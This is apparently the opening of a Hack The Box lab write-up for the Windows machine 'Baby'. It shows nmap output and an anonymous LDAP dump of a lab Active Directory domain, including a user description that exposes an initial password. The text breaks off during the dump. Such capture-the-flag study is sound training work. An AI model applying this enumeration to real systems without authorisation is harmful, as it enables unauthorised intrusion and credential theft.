---
title: Baby
date: 2026-4-5 00:40:00 +0200
categories: [writeup, hackthebox]
tags: [hackthebox, baby ]     
image:
    path: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/8906471ea6e0146ce13be096d7f45b27.png
    alt: Hack The Box
---

Windows · Easy - Adventure mode


## 🔭 Reconocimiento:
```shell
─$ nmap -p- -sSVC --min-rate 5000 10.129.121.110
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-11 18:32 +0100
Nmap scan report for 10.129.121.110
Host is up (0.042s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-11 17:33:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-11T17:35:02+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   DNS_Tree_Name: baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2026-02-11T17:34:22+00:00
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2026-02-10T17:31:49
|_Not valid after:  2026-08-12T17:31:49
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49913/tcp open  msrpc         Microsoft Windows RPC
59274/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
59275/tcp open  msrpc         Microsoft Windows RPC
59284/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-02-11T17:34:24
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.76 seconds
```

```shell
┌──(pmartinezr㉿kali)-[~/htb/baby]
└─$ ldapsearch -x -b "dc=baby, dc=vl"  -H ldap://10.129.121.110 > ldap.txt
# extended LDIF
#
# LDAPv3
# base <dc=baby, dc=vl> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# baby.vl
dn: DC=baby,DC=vl

# Administrator, Users, baby.vl
dn: CN=Administrator,CN=Users,DC=baby,DC=vl

# Guest, Users, baby.vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Guest
description: Built-in account for guest access to the computer/domain
distinguishedName: CN=Guest,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121144952.0Z
whenChanged: 20211121144952.0Z
uSNCreated: 8197
memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
uSNChanged: 8197
name: Guest
objectGUID:: 8XThJOa14ESxUfIZL3Bd9A==
userAccountControl: 66082
badPwdCount: 4
codePage: 0
countryCode: 0
badPasswordTime: 134153117763961616
lastLogoff: 0
lastLogon: 0
pwdLastSet: 0
primaryGroupID: 514
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtW9QEAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Guest
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# krbtgt, Users, baby.vl
dn: CN=krbtgt,CN=Users,DC=baby,DC=vl

# Domain Computers, Users, baby.vl
dn: CN=Domain Computers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Domain Computers
description: All workstations and servers joined to the domain
distinguishedName: CN=Domain Computers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12330
uSNChanged: 12332
name: Domain Computers
objectGUID:: 8qKP6f2OYESDGo4yvCZhJg==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWAwIAAA==
sAMAccountName: Domain Computers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Controllers, Users, baby.vl
dn: CN=Domain Controllers,CN=Users,DC=baby,DC=vl

# Schema Admins, Users, baby.vl
dn: CN=Schema Admins,CN=Users,DC=baby,DC=vl

# Enterprise Admins, Users, baby.vl
dn: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl

# Cert Publishers, Users, baby.vl
dn: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Cert Publishers
description: Members of this group are permitted to publish certificates to th
 e directory
distinguishedName: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12342
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
uSNChanged: 12344
name: Cert Publishers
objectGUID:: x28ME5jSJ0W4XxnLFk8cGQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWBQIAAA==
sAMAccountName: Cert Publishers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Admins, Users, baby.vl
dn: CN=Domain Admins,CN=Users,DC=baby,DC=vl

# Domain Users, Users, baby.vl
dn: CN=Domain Users,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Domain Users
description: All domain users
distinguishedName: CN=Domain Users,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12348
memberOf: CN=Users,CN=Builtin,DC=baby,DC=vl
uSNChanged: 12350
name: Domain Users
objectGUID:: yrTYUBBtnkyRqzm+ARpbng==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWAQIAAA==
sAMAccountName: Domain Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Domain Guests, Users, baby.vl
dn: CN=Domain Guests,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Domain Guests
description: All domain guests
distinguishedName: CN=Domain Guests,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12351
memberOf: CN=Guests,CN=Builtin,DC=baby,DC=vl
uSNChanged: 12353
name: Domain Guests
objectGUID:: 7f8QJoNCoka655vMSJ2Zww==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWAgIAAA==
sAMAccountName: Domain Guests
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Group Policy Creator Owners, Users, baby.vl
dn: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Group Policy Creator Owners
description: Members in this group can modify group policy for the domain
member: CN=Administrator,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12354
memberOf: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
uSNChanged: 12391
name: Group Policy Creator Owners
objectGUID:: W6ir0I0zIU+vqIk7rbI/CQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWCAIAAA==
sAMAccountName: Group Policy Creator Owners
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# RAS and IAS Servers, Users, baby.vl
dn: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: RAS and IAS Servers
description: Servers in this group can access remote access properties of user
 s
distinguishedName: CN=RAS and IAS Servers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12357
uSNChanged: 12359
name: RAS and IAS Servers
objectGUID:: wBcSheG2P0uiSxTMBNBFRw==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWKQIAAA==
sAMAccountName: RAS and IAS Servers
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Allowed RODC Password Replication Group, Users, baby.vl
dn: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Allowed RODC Password Replication Group
description: Members in this group can have their passwords replicated to all 
 read-only domain controllers in the domain
distinguishedName: CN=Allowed RODC Password Replication Group,CN=Users,DC=baby
 ,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12402
uSNChanged: 12404
name: Allowed RODC Password Replication Group
objectGUID:: ejILJr5sg0SodTROtBWkKA==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWOwIAAA==
sAMAccountName: Allowed RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Denied RODC Password Replication Group, Users, baby.vl
dn: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Denied RODC Password Replication Group
description: Members in this group cannot have their passwords replicated to a
 ny read-only domain controllers in the domain
member: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
member: CN=Group Policy Creator Owners,CN=Users,DC=baby,DC=vl
member: CN=Domain Admins,CN=Users,DC=baby,DC=vl
member: CN=Cert Publishers,CN=Users,DC=baby,DC=vl
member: CN=Enterprise Admins,CN=Users,DC=baby,DC=vl
member: CN=Schema Admins,CN=Users,DC=baby,DC=vl
member: CN=Domain Controllers,CN=Users,DC=baby,DC=vl
member: CN=krbtgt,CN=Users,DC=baby,DC=vl
distinguishedName: CN=Denied RODC Password Replication Group,CN=Users,DC=baby,
 DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12405
uSNChanged: 12433
name: Denied RODC Password Replication Group
objectGUID:: FlWRHCPS2kO+4s3ZtZ0CqQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWPAIAAA==
sAMAccountName: Denied RODC Password Replication Group
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Read-only Domain Controllers, Users, baby.vl
dn: CN=Read-only Domain Controllers,CN=Users,DC=baby,DC=vl

# Enterprise Read-only Domain Controllers, Users, baby.vl
dn: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Enterprise Read-only Domain Controllers
description: Members of this group are Read-Only Domain Controllers in the ent
 erprise
distinguishedName: CN=Enterprise Read-only Domain Controllers,CN=Users,DC=baby
 ,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12429
uSNChanged: 12431
name: Enterprise Read-only Domain Controllers
objectGUID:: VdcBFn79QU6kC1EKu4aWGw==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtW8gEAAA==
sAMAccountName: Enterprise Read-only Domain Controllers
sAMAccountType: 268435456
groupType: -2147483640
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Cloneable Domain Controllers, Users, baby.vl
dn: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Cloneable Domain Controllers
description: Members of this group that are domain controllers may be cloned.
distinguishedName: CN=Cloneable Domain Controllers,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12440
uSNChanged: 12442
name: Cloneable Domain Controllers
objectGUID:: AQdidj96k0yKAh5HXwjWWg==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWCgIAAA==
sAMAccountName: Cloneable Domain Controllers
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Protected Users, Users, baby.vl
dn: CN=Protected Users,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: Protected Users
description: Members of this group are afforded additional protections against
  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
 298939 for more information.
distinguishedName: CN=Protected Users,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145158.0Z
whenChanged: 20211121145158.0Z
uSNCreated: 12445
uSNChanged: 12447
name: Protected Users
objectGUID:: H0/844KdmEyf+3raVrqw6w==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWDQIAAA==
sAMAccountName: Protected Users
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
isCriticalSystemObject: TRUE
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 20211121145159.0Z
dSCorePropagationData: 16010101000417.0Z

# Key Admins, Users, baby.vl
dn: CN=Key Admins,CN=Users,DC=baby,DC=vl

# Enterprise Key Admins, Users, baby.vl
dn: CN=Enterprise Key Admins,CN=Users,DC=baby,DC=vl

# DnsAdmins, Users, baby.vl
dn: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: DnsAdmins
description: DNS Administrators Group
distinguishedName: CN=DnsAdmins,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145238.0Z
whenChanged: 20211121145238.0Z
uSNCreated: 12486
uSNChanged: 12488
name: DnsAdmins
objectGUID:: jebp5c9rh0OaBfewI/Q3IQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWTQQAAA==
sAMAccountName: DnsAdmins
sAMAccountType: 536870912
groupType: -2147483644
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# DnsUpdateProxy, Users, baby.vl
dn: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: DnsUpdateProxy
description: DNS clients who are permitted to perform dynamic updates on behal
 f of some other clients (such as DHCP servers).
distinguishedName: CN=DnsUpdateProxy,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121145238.0Z
whenChanged: 20211121145238.0Z
uSNCreated: 12491
uSNChanged: 12491
name: DnsUpdateProxy
objectGUID:: Yc+jX1fev062aq+aBhDmbQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWTgQAAA==
sAMAccountName: DnsUpdateProxy
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# dev, Users, baby.vl
dn: CN=dev,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: dev
member: CN=Ian Walker,OU=dev,DC=baby,DC=vl
member: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
member: CN=Hugh George,OU=dev,DC=baby,DC=vl
member: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
member: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
distinguishedName: CN=dev,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151102.0Z
whenChanged: 20211121151103.0Z
displayName: dev
uSNCreated: 12789
uSNChanged: 12840
name: dev
objectGUID:: YbzrRV+4J0W4be5Cc4WJiQ==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWTwQAAA==
sAMAccountName: dev
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# Jacqueline Barnett, dev, baby.vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Jacqueline Barnett
sn: Barnett
givenName: Jacqueline
distinguishedName: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Jacqueline Barnett
uSNCreated: 12793
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12798
name: Jacqueline Barnett
objectGUID:: /Lm9eucHIkS9Gr+pwGrvHA==
userAccountControl: 66080
badPwdCount: 4
codePage: 0
countryCode: 0
badPasswordTime: 134153117765367728
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810632000928
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Jacqueline.Barnett
sAMAccountType: 805306368
userPrincipalName: Jacqueline.Barnett@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Ashley Webb, dev, baby.vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Ashley Webb
sn: Webb
givenName: Ashley
distinguishedName: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Ashley Webb
uSNCreated: 12803
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12808
name: Ashley Webb
objectGUID:: P1UeCcUZGUO6xywh/3Gw/g==
userAccountControl: 66080
badPwdCount: 4
codePage: 0
countryCode: 0
badPasswordTime: 134153117767087086
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810633407081
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Ashley.Webb
sAMAccountType: 805306368
userPrincipalName: Ashley.Webb@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Hugh George, dev, baby.vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Hugh George
sn: George
givenName: Hugh
distinguishedName: CN=Hugh George,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Hugh George
uSNCreated: 12813
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12818
name: Hugh George
objectGUID:: kzlvIum6eEqohHq3BwrYoA==
userAccountControl: 66080
badPwdCount: 4
codePage: 0
countryCode: 0
badPasswordTime: 134153117768649064
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810634363083
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Hugh.George
sAMAccountType: 805306368
userPrincipalName: Hugh.George@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Leonard Dyer, dev, baby.vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Leonard Dyer
sn: Dyer
givenName: Leonard
distinguishedName: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151103.0Z
whenChanged: 20211121151103.0Z
displayName: Leonard Dyer
uSNCreated: 12823
memberOf: CN=dev,CN=Users,DC=baby,DC=vl
uSNChanged: 12828
name: Leonard Dyer
objectGUID:: VkMQnkPgw0GAkDCiq9LOhA==
userAccountControl: 66080
badPwdCount: 4
codePage: 0
countryCode: 0
badPasswordTime: 134153117770211656
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810635678033
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWUwQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Leonard.Dyer
sAMAccountType: 805306368
userPrincipalName: Leonard.Dyer@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Ian Walker, dev, baby.vl
dn: CN=Ian Walker,OU=dev,DC=baby,DC=vl

# it, Users, baby.vl
dn: CN=it,CN=Users,DC=baby,DC=vl
objectClass: top
objectClass: group
cn: it
member: CN=Caroline Robinson,OU=it,DC=baby,DC=vl
member: CN=Teresa Bell,OU=it,DC=baby,DC=vl
member: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
member: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
member: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
distinguishedName: CN=it,CN=Users,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20240727221156.0Z
displayName: it
uSNCreated: 12845
memberOf: CN=Remote Management Users,CN=Builtin,DC=baby,DC=vl
uSNChanged: 40986
name: it
objectGUID:: qeenEG1110W2UCafhBWyfA==
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWVQQAAA==
sAMAccountName: it
sAMAccountType: 268435456
groupType: -2147483646
objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163013.0Z
dSCorePropagationData: 16010101000001.0Z

# Connor Wilkinson, it, baby.vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Connor Wilkinson
sn: Wilkinson
givenName: Connor
distinguishedName: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Connor Wilkinson
uSNCreated: 12849
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12854
name: Connor Wilkinson
objectGUID:: CSm4NoxCPEGpnplkzZapcw==
userAccountControl: 66080
badPwdCount: 4
codePage: 0
countryCode: 0
badPasswordTime: 134153117771774012
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810684117255
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWVgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Connor.Wilkinson
sAMAccountType: 805306368
userPrincipalName: Connor.Wilkinson@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Joseph Hughes, it, baby.vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Joseph Hughes
sn: Hughes
givenName: Joseph
distinguishedName: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Joseph Hughes
uSNCreated: 12869
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12874
name: Joseph Hughes
objectGUID:: ro0OQulY1U+EZmNSj15XBw==
userAccountControl: 66080
badPwdCount: 4
codePage: 0
countryCode: 0
badPasswordTime: 134153117773336543
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810685992446
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWAQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Joseph.Hughes
sAMAccountType: 805306368
userPrincipalName: Joseph.Hughes@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Kerry Wilson, it, baby.vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Kerry Wilson
sn: Wilson
givenName: Kerry
distinguishedName: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151108.0Z
displayName: Kerry Wilson
uSNCreated: 12879
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12884
name: Kerry Wilson
objectGUID:: vZ3N44jyakmXClchAicbbg==
userAccountControl: 66080
badPwdCount: 4
codePage: 0
countryCode: 0
badPasswordTime: 134153117774898962
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819810686929995
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Kerry.Wilson
sAMAccountType: 805306368
userPrincipalName: Kerry.Wilson@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Teresa Bell
sn: Bell
description: Set initial password to BabyStart123!
givenName: Teresa
distinguishedName: CN=Teresa Bell,OU=it,DC=baby,DC=vl
instanceType: 4
whenCreated: 20211121151108.0Z
whenChanged: 20211121151437.0Z
displayName: Teresa Bell
uSNCreated: 12889
memberOf: CN=it,CN=Users,DC=baby,DC=vl
uSNChanged: 12905
name: Teresa Bell
objectGUID:: EDGXW4JjgEq7+GuyHBu3QQ==
userAccountControl: 66080
badPwdCount: 21
codePage: 0
countryCode: 0
badPasswordTime: 134153117776461551
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132819812778759642
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAf1veU67Ze+7mkhtWWgQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: Teresa.Bell
sAMAccountType: 805306368
userPrincipalName: Teresa.Bell@baby.vl
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=baby,DC=vl
dSCorePropagationData: 20211121163014.0Z
dSCorePropagationData: 20211121162927.0Z
dSCorePropagationData: 16010101000416.0Z
msDS-SupportedEncryptionTypes: 0

# Caroline Robinson, it, baby.vl
